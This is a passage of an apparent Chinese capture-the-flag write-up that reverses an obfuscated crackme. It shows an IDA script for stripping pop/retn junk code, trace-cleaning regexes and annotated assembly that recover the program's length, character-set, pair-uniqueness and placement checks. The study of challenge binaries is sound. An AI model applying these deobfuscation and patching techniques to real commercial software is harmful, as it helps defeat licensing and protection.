class="number">0x1400645e4</span>,<span class="number">0x14002ade3</span>,<span class="number">0x1400201b3</span>,<span class="number">0x1400585f8</span>,<span class="number">0x1400344a2</span>,<span class="number">0x14003746d</span>,<span class="number">0x140093ae9</span>,<span class="number">0x1400f8f00</span>,<span class="number">0x14003cb4b</span>,<span class="number">0x1400a0472</span>,<span class="number">0x14004cc27</span>,<span class="number">0x1400a720f</span>,<span class="number">0x140062b19</span>,<span class="number">0x1400d7e9d</span>,<span class="number">0x140035b53</span>,<span class="number">0x1400489eb</span>,<span class="number">0x1400c93d1</span>,<span class="number">0x140049b13</span>,<span class="number">0x1400b6994</span>,<span class="number">0x1400dc2a0</span>,<span class="number">0x1400b1d93</span>,<span class="number">0x14007a048</span>,<span class="number">0x1400bbdb4</span>,<span class="number">0x140093534</span>,<span class="number">0x1400a939a</span>,<span class="number">0x140065701</span>,<span class="number">0x1400ac86b</span>,<span class="number">0x14003c7f8</span>,<span class="number">0x1400b2b4d</span>,<span class="number">0x1400e5d05</span>,<span class="number">0x1400c9ee6</span>,<span class="number">0x1400961bf</span>,<span class="number">0x1400d1abe</span>,<span class="number">0x1400e6ac8</span>,<span class="number">0x1400c8f1f</span>,<span class="number">0x14005e050</span>,<span class="number">0x140095e85</span>,<span class="number">0x1400610a1</span>,<span class="number">0x14003a0b5</span>,<span class="number">0x1400cda74</span>,<span class="number">0x14009367b</span>,<span class="number">0x1400c26a0</span>,<span class="number">0x1400b3149</span>,<span class="number">0x140024323</span>,<span class="number">0x14000234c</span>,<span class="number">0x1400175a1</span>,<span class="number">0x14001a8f0</span>,<span class="number">0x1400a1493</span>,<span class="number">0x140052dc1</span>,<span class="number">0x1400cfa4f</span>,<span class="number">0x1400c82e5</span>,<span class="number">0x14008e488</span>,<span class="number">0x140026895</span>,<span class="number">0x1400d667c</span>,<span class="number">0x14002cd55</span>,<span class="number">0x1400f5c45</span>,<span class="number">0x14008bf75</span>,<span class="number">0x140010075</span>,<span class="number">0x1400190b3</span>,<span class="number">0x1400de7d0</span>,<span class="number">0x14008d5d4</span>,<span class="number">0x1400e4a0c</span>,<span class="number">0x1400a7382</span>,<span class="number">0x140037876</span>,<span class="number">0x1400d5016</span>,<span class="number">0x1400c7b84</span>,<span class="number">0x14003ad82</span>,<span class="number">0x140065331</span>,<span class="number">0x140013029</span>,<span class="number">0x1400b4f3a</span>,<span class="number">0x14008c9ee</span>,<span class="number">0x1400c376e</span>,<span class="number">0x1400f95db</span>,<span class="number">0x14003eb8e</span>,<span class="number">0x140070774</span>,<span class="number">0x140051198</span>,<span class="number">0x1400bd38a</span>,<span class="number">0x14008c893</span>,<span class="number">0x140041e14</span>,<span class="number">0x140092f4a</span>,<span class="number">0x1400e487b</span>,<span class="number">0x1400f75f6</span>,<span class="number">0x140021d1b</span>,<span class="number">0x140013251</span>,<span class="number">0x14005047c</span>,<span class="number">0x140028abd</span>,<span class="number">0x1400e5392</span>,<span class="number">0x1400a8349</span>,<span class="number">0x14007619b</span>,<span class="number">0x14004cfaf</span>,<span class="number">0x140051b04</span>,<span class="number">0x140020bc7</span>,<span class="number">0x1400122e2</span>,<span class="number">0x140079ad8</span>,<span class="number">0x1400c5aa9</span>,<span class="number">0x14008fdb8</span>,<span class="number">0x1400b6b57</span>,<span class="number">0x1400ef67c</span>,<span class="number">0x14008239c</span>,<span class="number">0x14008f521</span>,<span class="number">0x140084df2</span>,<span class="number">0x1400d203c</span>,<span class="number">0x1400108a1</span>,<span class="number">0x1400e399d</span>,<span class="number">0x140021f1c</span>,<span class="number">0x14001d98f</span>,<span class="number">0x1400d9e3c</span>,<span class="number">0x1400a86dd</span>,<span class="number">0x1400ce809</span>,<span class="number">0x140032394</span>,<span class="number">0x140093660</span>,<span class="number">0x14001f168</span>,<span class="number">0x14009aabc</span>,<span class="number">0x1400ed298</span>,<span class="number">0x1400dc6f5</span>,<span class="number">0x140002691</span>,<span class="number">0x1400b603b</span>,<span class="number">0x14009c76a</span>,<span class="number">0x140053a4f</span>,<span class="number">0x1400411dc</span>,<span class="number">0x1400411e2</span>,<span class="number">0x1400cf6b9</span>,<span class="number">0x140049b81</span>,<span class="number">0x140053fcb</span>,<span class="number">0x1400fa16d</span>,<span class="number">0x14001d49c</span>,<span class="number">0x14002d10f</span>,<span class="number">0x14009644f</span>,<span class="number">0x140068922</span>,<span class="number">0x1400f734a</span>,<span class="number">0x1400195f6</span>,<span class="number">0x1400b932b</span>,<span class="number">0x1400a7f82</span>,<span class="number">0x140020c11</span>,<span class="number">0x1400d1807</span>,<span class="number">0x14006b86f</span>,<span class="number">0x1400a0e4f</span>,<span class="number">0x140033127</span>,<span class="number">0x1400db36d</span>,<span class="number">0x14005cf3b</span>,<span class="number">0x14005d401</span>,<span class="number">0x1400d70e7</span>,<span class="number">0x14006b0e0</span>,<span class="number">0x14009b72b</span>,<span class="number">0x14004f9a3</span>,<span class="number">0x1400cb0a9</span>,<span class="number">0x1400d9db0</span>,<span class="number">0x1400677e0</span>,<span class="number">0x1400113c0</span>,<span class="number">0x1400e0c75</span>,<span class="number">0x140042cfe</span>,<span class="number">0x14000bcd7</span>,<span class="number">0x14009a73b</span>,<span class="number">0x1400b0a29</span>,<span class="number">0x1400a25e7</span>,<span class="number">0x1400de3af</span>,<span class="number">0x140097af0</span>,<span class="number">0x14000b885</span>,<span class="number">0x1400e2a2a</span>,<span class="number">0x1400fa18e</span>,<span class="number">0x1400017a2</span>,<span class="number">0x1400f7e0d</span>,<span class="number">0x1400e08ef</span>,<span class="number">0x14008b954</span>,<span class="number">0x140039307</span>,<span class="number">0x140080b6f</span>,<span class="number">0x140017839</span>,<span class="number">0x140062a08</span>,<span class="number">0x140019442</span>,<span class="number">0x1400b5921</span>,<span class="number">0x140011462</span>,<span class="number">0x1400f9d12</span>,<span class="number">0x1400d91a0</span>,<span class="number">0x140012fa9</span>,<span class="number">0x140067ef0</span>,<span class="number">0x1400b7c3d</span>,<span class="number">0x1400752dd</span>,<span class="number">0x14002715b</span>,<span class="number">0x140010b61</span>,<span class="number">0x1400e9d43</span>,<span class="number">0x1400f0464</span>,<span class="number">0x1400ded5f</span>,<span class="number">0x1400843dd</span>,<span class="number">0x1400843e1</span>,<span class="number">0x14008020d</span>,<span class="number">0x140028484</span>,<span class="number">0x1400f8380</span>,<span class="number">0x140053e38</span>,<span class="number">0x140036180</span>,<span class="number">0x140080d39</span>,<span class="number">0x1400a6c18</span>,<span class="number">0x1400b6324</span>,<span class="number">0x1400de837</span>,<span class="number">0x1400a7352</span>,<span class="number">0x14007cd16</span>,<span class="number">0x1400f0f20</span>,<span class="number">0x14007cfdd</span>,<span class="number">0x14009002f</span>,<span class="number">0x140080a00</span>,<span class="number">0x1400f1551</span>,<span class="number">0x1400255b8</span>,<span class="number">0x1400e31b1</span>,<span class="number">0x1400875e0</span>,<span class="number">0x1400ba9cc</span>,<span class="number">0x1400aca2c</span>,<span class="number">0x1400b8ef7</span>,<span class="number">0x14008a498</span>,<span class="number">0x14004849e</span>,<span class="number">0x1400ec496</span>,<span class="number">0x14007afe0</span>,<span class="number">0x1400920af</span>,<span class="number">0x1400c9bcb</span>,<span class="number">0x1400e18bb</span>,<span class="number">0x1400b873b</span>,<span class="number">0x14000f17c</span>,<span class="number">0x140026de4</span>,<span class="number">0x1400ed51b</span>,<span class="number">0x140002a2b</span>,<span class="number">0x1400866d4</span>,<span class="number">0x140070872</span>,<span class="number">0x14005b83e</span>,<span class="number">0x14009341f</span>,<span class="number">0x1400b74ac</span>,<span class="number">0x14005bf73</span>,<span class="number">0x1400d8fa2</span>,<span class="number">0x140058517</span>,<span class="number">0x14004545f</span>,<span class="number">0x1400b80cb</span>,<span class="number">0x1400b1e14</span>,<span class="number">0x1400cb869</span>,<span class="number">0x1400b78c0</span>,<span class="number">0x1400f5b05</span>,<span class="number">0x140017e14</span>,<span class="number">0x1400a3f95</span>,<span class="number">0x14007816c</span>,<span class="number">0x140031b63</span>,<span class="number">0x14004bd45</span>,<span class="number">0x1400f6131</span>,<span class="number">0x1400b3d6f</span>,<span class="number">0x140055cca</span>,<span class="number">0x140033675</span>,<span class="number">0x14006781a</span>,<span class="number">0x1400528e0</span>,<span class="number">0x14005890e</span>,<span class="number">0x1400b7575</span>,<span class="number">0x14006d905</span>,<span class="number">0x1400add65</span>,<span class="number">0x1400f6918</span>,<span class="number">0x140029440</span>,<span class="number">0x1400201b3</span>,<span class="number">0x1400585f8</span>,<span class="number">0x1400344a2</span>,<span class="number">0x14003746d</span>,<span class="number">0x140093ae9</span>,<span class="number">0x1400f8f00</span>,<span class="number">0x14003cb4b</span>,<span class="number">0x1400a0472</span>,<span class="number">0x14004cc27</span>,<span class="number">0x1400a720f</span>,<span class="number">0x140062b19</span>,<span class="number">0x1400d7e9d</span>,<span class="number">0x140035b53</span>,<span class="number">0x1400489eb</span>,<span class="number">0x1400c93d1</span>,<span class="number">0x140049b13</span>,<span class="number">0x1400b6994</span>,<span class="number">0x1400dc2a0</span>,<span class="number">0x1400b1d93</span>,<span class="number">0x14007a048</span>,<span class="number">0x1400bbdb4</span>,<span class="number">0x140093534</span>,<span class="number">0x1400a939a</span>,<span class="number">0x140065701</span>,<span class="number">0x1400ac86b</span>,<span class="number">0x14003c7f8</span>,<span class="number">0x1400b2b4d</span>,<span class="number">0x1400e5d05</span>,<span class="number">0x1400618cc</span>,<span class="number">0x1400d4c95</span>,<span class="number">0x14008b527</span>,<span class="number">0x140024dd7</span>,<span class="number">0x14002893c</span>,<span class="number">0x1400cee23</span>,<span class="number">0x1400c8251</span>,<span class="number">0x1400bcd83</span>,<span class="number">0x1400d591a</span>,<span class="number">0x140084140</span>,<span class="number">0x140027a64</span>,<span class="number">0x14008c361</span>,<span class="number">0x1400DFC26</span>,<span class="number">0x140084AF9</span>,<span class="number">0x14000E2D5</span>,<span class="number">0x14000EEBD</span>,<span class="number">0x1400889B6</span>,<span class="number">0x14006390E</span>,<span class="number">0x14007C4CD</span>,<span class="number">0x140012781</span>,<span class="number">0x140048357</span>,<span class="number">0x1400596FF</span>,<span class="number">0x14008807F</span>,<span class="number">0x140014acc</span>,<span class="number">0x140022c16</span>,<span class="number">0x1400e6a73</span>,<span class="number">0x140014D26</span>,<span class="number">0x140091363</span>, <span class="number">0x140014acc</span>,<span class="number">0x14006E7A8</span>,<span class="number">0x14004785B</span>,<span class="number">0x1400E2890</span>,<span class="number">0x14008334E</span>,<span class="number">0x140061f8b</span>,<span class="number">0x1400620f3</span>, <span class="number">0x1400d75d7</span>,<span class="number">0x1400d50cf</span>,<span class="number">0x140082b78</span>,<span class="number">0x1400d1579</span>,<span class="number">0x140024af6</span>,<span class="number">0x14006cf3b</span>,<span class="number">0x1400d0f8e</span>, <span class="number">0x14006689C</span>,<span class="number">0x140057B79</span>,<span class="number">0x1400D58AC</span>,<span class="number">0x140001a06</span>,<span class="number">0x1400b5d46</span>,<span class="number">0x1400e1e42</span>,<span class="number">0x1400B9910</span>, <span class="number">0x14002A213</span>,<span class="number">0x1400BC169</span>,<span class="number">0x14003AB45</span>,<span class="number">0x14006D099</span>,<span class="number">0x14006b00b</span>,<span class="number">0x1400c86f1</span>,<span class="number">0x1400f9bfa</span>, <span class="number">0x140021245</span>,<span class="number">0x1400EC7AE</span>,<span class="number">0x1400A5B1A</span>,<span class="number">0x1400C9E5E</span>,<span class="number">0x140039D11</span>]</span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nowlist:</span><br><span class="line"><span class="comment">#    print(hex(i))</span></span><br><span class="line">    AutoMark(i,AU_CODE)</span><br><span class="line"><span class="comment">#    fuckret(i)</span></span><br><span class="line">    <span class="keyword">if</span> fuckret(i) &gt; <span class="number">0</span>:</span><br><span class="line">        path.append(i)</span><br></pre></td></tr></table></figure><h4 id="0x02-patch-etc"><a href="#0x02-patch-etc" class="headerlink" title="0x02 patch etc"></a>0x02 patch etc</h4><p>去完以上混淆以后 </p><p>再尝试 trace </p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600213/0" alt=""></p><p>可以利用以下正则表达式去掉 trace 文本中的很多无用信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^(.*)jmp(.*)\r\n</span><br><span class="line">^(.*)nop(.*)\r\n</span><br><span class="line">^(.*)00007FFF(.*)\r\n</span><br></pre></td></tr></table></figure><p>然后可以发现还剩下一些 pop retn 没有去掉</p><p>没有去掉的原因呢 是因为仍然有变种的 pop retn</p><p>这种变种的 pop retn 中插了有意义的代码 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    rax                     </span><br><span class="line">push    rax                     </span><br><span class="line">pushfq                          </span><br><span class="line">push    rax                     </span><br><span class="line">push    rax                     </span><br><span class="line">pushfq                          </span><br><span class="line">call    $+5                     </span><br><span class="line">pop     rax                     </span><br><span class="line">xor     rax, 6665h              </span><br><span class="line">mov     [rsp+10h], rax   </span><br><span class="line">popfq                           </span><br><span class="line">pop     rax                     </span><br><span class="line">pop     rax                     </span><br><span class="line">add     rax, 36F74h             </span><br><span class="line">mov     [rsp+10h], rax        </span><br><span class="line">popfq                           </span><br><span class="line">pop     rax</span><br><span class="line">moveax, 1###有用的代码</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>这种混淆要识别有用的代码 而且各个有用的代码都不相同 有的甚至是嵌套 pop ret 给识别带来很大的困难</p><p>考虑到此时已经可以大概看的了汇编了 于是就不准备再继续写 patch 了</p><h3 id="0x1-还原"><a href="#0x1-还原" class="headerlink" title="0x1 还原"></a>0x1 还原</h3><p>直接调试被 patch 以后的程序 F9运行到挂起等待输入 点击暂停 随便输入以后会断下来</p><p>按 alt+F9 回到用户代码段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000014008C365call r10&#x2F;&#x2F;scanf</span><br></pre></td></tr></table></figure><p>在system函数下断点 从这里开始 trace</p><h4 id="0x10-检查长度"><a href="#0x10-检查长度" class="headerlink" title="0x10 检查长度"></a>0x10 检查长度</h4><p>把结果中的 nop jmp 系统函数地址的代码 全部替换为空</p><p>尝试搜索一下cmp 发现一个可疑的地方</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600360/0" alt=""></p><p>回到没去掉系统段的函数的时候</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599600445/0" alt=""></p><p>再调试确认一下输入 84 长度的假码 rax == 54 很明显这里的逻辑就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(input) != <span class="number">0x54</span>)</span><br><span class="line">    print(' &gt;&gt;&gt; 阁下的数学成绩堪忧，请回吧。')</span><br><span class="line">system(<span class="string">"pause"</span>)</span><br></pre></td></tr></table></figure><h4 id="0x11-输入范围"><a href="#0x11-输入范围" class="headerlink" title="0x11 输入范围"></a>0x11 输入范围</h4><p>继续往下 trace</p><p>trace完用前面的那个找ret的下一行的脚本 再用前面的去混淆 保存 再trace就很干净了</p><p>很容易可以看见一个循环 找到几句关键代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">140027B39   cmp eax,30</span><br><span class="line">1400CBFAD   cmp eax,39 </span><br><span class="line">1400A27A9   cmp eax,41</span><br><span class="line">1400A07D9   cmp eax,5A</span><br><span class="line">1400BE069   cmp qword ptr ss:[rsp+B0],54</span><br><span class="line">140069753   jge patch3.14006976C</span><br></pre></td></tr></table></figure><p>这里很明显就是比较输入范围是 0-9 A-Z</p><h4 id="0x12-转换输入"><a href="#0x12-转换输入" class="headerlink" title="0x12 转换输入"></a>0x12 转换输入</h4><p>再从循环尾往下找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1400731D7mov byte ptr ss:[rsp+7],cl</span><br><span class="line">1400938D7cmp eax,30</span><br><span class="line">14001A372cmp eax,39</span><br><span class="line">140069CABsub rax,30</span><br><span class="line"></span><br><span class="line">14000224Dcmp eax,41</span><br><span class="line">1400B2DC9cmp eax,5A </span><br><span class="line">14004B966sub rax,41</span><br><span class="line">140094D9Cadd rax,A</span><br><span class="line"></span><br><span class="line">14007F965mov qword ptr ss:[rsp+A8],rax</span><br><span class="line">140054381cmp qword ptr ss:[rsp+A8],2A</span><br><span class="line"></span><br><span class="line">1400BA991imul rax,rax,2A</span><br></pre></td></tr></table></figure><p>观察了一下分支是从这个比较错开的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1400906DBcmp rax,qword ptr ss:[rsp+rcx*8+EC0]</span><br><span class="line">1400A9B93jg patch3.1400A9BAC</span><br></pre></td></tr></table></figure><p>查看了一下寄存器这里比较的是1AF 与25B</p><p>再查询了一下上下文</p><p>我的输入是 ABCDEFABCDEF….</p><p>1AF 是由  0xA*0x2a + 0xB算来的   25B是由0xE * 0x2a + 0xF</p><p>同时这里的循环计次变量为3</p><p>可以推算出 把输入从 str 变成了 hex 之后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( i != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span>( input_hex[i]*<span class="number">0x2a</span>+input_hex[i+<span class="number">1</span>] &lt; input_hex[i<span class="number">-2</span>]*<span class="number">0x2a</span>+input_hex[i<span class="number">-1</span>] )</span><br><span class="line">        GG</span><br></pre></td></tr></table></figure><p>当前这一位前一位 * 0x2a + 后一位</p><p>也就是把 hex 的两位看成一位来运算</p><p>此时感觉有点不对 输入10位数字加上26位字母只有36位 而他比较42位感觉还有几位输入</p><p>输入了一些不是上面范围的字符 再跑了一下 发现了剩下的几位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">140045713   cmp eax,2B +</span><br><span class="line">140071B51   cmp eax,2D -</span><br><span class="line">1400F5DA9   cmp eax,2A *</span><br><span class="line">140014C52   cmp eax,2F &#x2F;</span><br><span class="line">140081C7A   cmp eax,25 %</span><br><span class="line">140003A93   cmp eax,3D &#x3D;</span><br></pre></td></tr></table></figure><p>转换之后是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1400F5A62 | 83F8 2B                  | cmp eax,2B</span><br><span class="line">140003A25 | 48:C74424 08 24000000    | mov qword ptr ss:[rsp+8],24</span><br><span class="line"></span><br><span class="line">140096D4F | 83F8 2D                  | cmp eax,2D</span><br><span class="line">1400528A1 | 48:C74424 08 25000000    | mov qword ptr ss:[rsp+8],25</span><br><span class="line"></span><br><span class="line">14001E900 | 83F8 2A                  | cmp eax,2A</span><br><span class="line">14005337E | 48:C74424 08 26000000    | mov qword ptr ss:[rsp+8],26</span><br><span class="line"></span><br><span class="line">1400F3D8E | 83F8 2F                  | cmp eax,2F</span><br><span class="line">14000C5FA | 48:C74424 08 27000000    | mov qword ptr ss:[rsp+8],27</span><br><span class="line"></span><br><span class="line">140064EDF | 83F8 25                  | cmp eax,25</span><br><span class="line">1400AEF1C | 48:C74424 08 28000000    | mov qword ptr ss:[rsp+8],28</span><br><span class="line"></span><br><span class="line">1400C9DE1 | 83F8 3D                  | cmp eax,3D</span><br><span class="line">14007B859 | 48:C74424 08 29000000    | mov qword ptr ss:[rsp+8],29</span><br></pre></td></tr></table></figure><p>很好现在已经把输入范围和输入转换搞定了 继续往下看</p><h4 id="0x13-重复检查"><a href="#0x13-重复检查" class="headerlink" title="0x13 重复检查"></a>0x13 重复检查</h4><p>再往下发现还是走不下去</p><p>在走不下去的附近有如下逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">14007D9D5mov qword ptr ss:[rsp+A0],0</span><br><span class="line">140002310cmp qword ptr ss:[rsp+A0],2A</span><br><span class="line">140001F98mov rax,qword ptr ss:[rsp+A0]</span><br><span class="line"></span><br><span class="line">14002D5ACmov rax,qword ptr ss:[rsp+rax*8+EC0]</span><br><span class="line">140073E00mov ecx,2A</span><br><span class="line">14009EA4Fidiv rcx</span><br><span class="line">14006EC35mov qword ptr ss:[rsp+98],rdx&#x2F;&#x2F;[rsp+98]&#x3D;change[i]%0x2A</span><br><span class="line">140060863mov rdx,qword ptr ss:[rsp+A0]</span><br><span class="line">140063300mov rdx,qword ptr ss:[rsp+rdx*8+EC0]</span><br><span class="line">140017083mov rax,rdx</span><br><span class="line">1400BCF6Cidiv rcx </span><br><span class="line">1400BF3EFmov qword ptr ss:[rsp+90],rax&#x2F;&#x2F;[rsp+90]&#x3D;change[i]&#x2F;0x2A</span><br><span class="line"></span><br><span class="line">1400BF3EFmov rax,qword ptr ss:[rsp+98]</span><br><span class="line">14004B8F8test byte ptr ss:[rsp+rax+E90],1</span><br><span class="line">14005224Cmov rax,qword ptr ss:[rsp+90]</span><br><span class="line">140015F89test byte ptr ss:[rsp+rax+E60],1</span><br><span class="line"></span><br><span class="line">140027ACEmov rax,qword ptr ss:[rsp+98]</span><br><span class="line">1400E4C50mov byte ptr ss:[rsp+rax+E90],1</span><br><span class="line">1400AC622mov rax,qword ptr ss:[rsp+90]</span><br><span class="line">1400B5248mov byte ptr ss:[rsp+rax+E60],1</span><br><span class="line">140037CD0mov rax,qword ptr ss:[rsp+A0]</span><br><span class="line">140026ABBadd rax,1</span><br><span class="line">1400258E6mov qword ptr ss:[rsp+A0],rax</span><br></pre></td></tr></table></figure><p>这里得取余和除法其实是把 hex形式 再重新提取出来了</p><p>然后以其作为数组下标,去一个表中判断</p><p>如果没有被填过 那就填入并继续循环</p><p>如果已经被填过 那就GG</p><p>用代码来说的话就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">table1[<span class="number">0x2a</span>]=&#123;&#125;</span><br><span class="line">table2[<span class="number">0x2a</span>]=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input_hex),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> table1[input_hex[i]] == <span class="number">0</span> <span class="keyword">and</span> table2[input_hex[i+<span class="number">1</span>]] == <span class="number">0</span>:</span><br><span class="line">table1[input_hex[i]] = <span class="number">1</span></span><br><span class="line">table2[input_hex[i+<span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">GG</span><br></pre></td></tr></table></figure><p>用人话来理解就是 奇数位 和 偶数位 的输入序列 每一个输入只允许出现一次</p><p>结合此两位大于前两位的规则</p><p>可以知道奇数位已经是确定为</p><p>0123456….+-*/%=</p><h4 id="0x14-落子检查"><a href="#0x14-落子检查" class="headerlink" title="0x14 落子检查"></a>0x14 落子检查</h4><p>输入满足当前条件的输入再继续往下 trace</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">1400C86F5   mov qword ptr ss:[rsp+88],0             </span><br><span class="line">1400D320E   cmp qword ptr ss:[rsp+88],2A            &#x2F;&#x2F;循环1</span><br><span class="line">140056B2F   jge patch3.140056B48                    &#x2F;&#x2F;[rsp+88] &#x3D; i</span><br><span class="line"></span><br><span class="line">1400CBE10   mov rax,qword ptr ss:[rsp+88]           </span><br><span class="line">140052E9D   add rax,1                               </span><br><span class="line">140078F7F   mov qword ptr ss:[rsp+80],rax           &#x2F;&#x2F;[rsp+80] &#x3D; j &#x3D; i + 1</span><br><span class="line">1400286DB   cmp qword ptr ss:[rsp+80],2A            &#x2F;&#x2F;循环2</span><br><span class="line">14000D91A   jge patch3.14000D933                    </span><br><span class="line">&#x2F;&#x2F;change &#x3D;&#x3D; rsp+EC0</span><br><span class="line">1400F755C   mov rax,qword ptr ss:[rsp+88]           </span><br><span class="line">140098656   mov rax,qword ptr ss:[rsp+rax*8+EC0]    </span><br><span class="line">140001584   cqo                                     </span><br><span class="line">1400A4ADC   mov ecx,2A                              </span><br><span class="line">14001F9E4   idiv rcx                                </span><br><span class="line">14009D9EA   mov r8,qword ptr ss:[rsp+80]            </span><br><span class="line">1400EDA1E   mov r8,qword ptr ss:[rsp+r8*8+EC0]      </span><br><span class="line">14000EA19   mov rax,r8                              </span><br><span class="line">1400A04C3   mov qword ptr ss:[rsp+38],rdx       &#x2F;&#x2F;[rsp+38] &#x3D; change[i] % 0x2a</span><br><span class="line">140037898   cqo                                     </span><br><span class="line">14008A550   idiv rcx                                </span><br><span class="line">1400399F2   mov r8,qword ptr ss:[rsp+38]            </span><br><span class="line">1400D4106   sub r8,rdx                              &#x2F;&#x2F;[rsp+78] &#x3D; [rsp+38] - change[j] % 0x2a</span><br><span class="line">1400901F7   mov qword ptr ss:[rsp+78],r8            </span><br><span class="line">14009DAAD   mov rdx,qword ptr ss:[rsp+88]           </span><br><span class="line">14000E4E3   mov rdx,qword ptr ss:[rsp+rdx*8+EC0]    </span><br><span class="line">1400EE409   mov rax,rdx                             </span><br><span class="line">1400C5EE9   cqo                                     </span><br><span class="line">140020832   idiv rcx                                </span><br><span class="line">14008C074   mov r8,qword ptr ss:[rsp+80]            </span><br><span class="line">14006079F   mov r8,qword ptr ss:[rsp+r8*8+EC0]      </span><br><span class="line">140013395   mov qword ptr ss:[rsp+30],rax           &#x2F;&#x2F;[rsp+30] &#x3D; change[j] &#x2F; 0x2a</span><br><span class="line">1400C5CE1   mov rax,r8                              </span><br><span class="line">14002FFF8   cqo                                     </span><br><span class="line">14007539E   idiv rcx                                </span><br><span class="line">14006BF8A   mov rcx,qword ptr ss:[rsp+30]           </span><br><span class="line">1400DB4A6   sub rcx,rax                             </span><br><span class="line">1400E127D   mov qword ptr ss:[rsp+70],rcx           &#x2F;&#x2F;[rsp+70] &#x3D; [rsp+30] - change[i] &#x2F; 0x2a</span><br><span class="line">140073B88   cmp qword ptr ss:[rsp+78],0</span><br><span class="line">14006437Ejge patch3.140064397&#x2F;&#x2F;若满足条件跳转 下面这一段不执行</span><br><span class="line"></span><br><span class="line">1400BFF7E   xor eax,eax                      </span><br><span 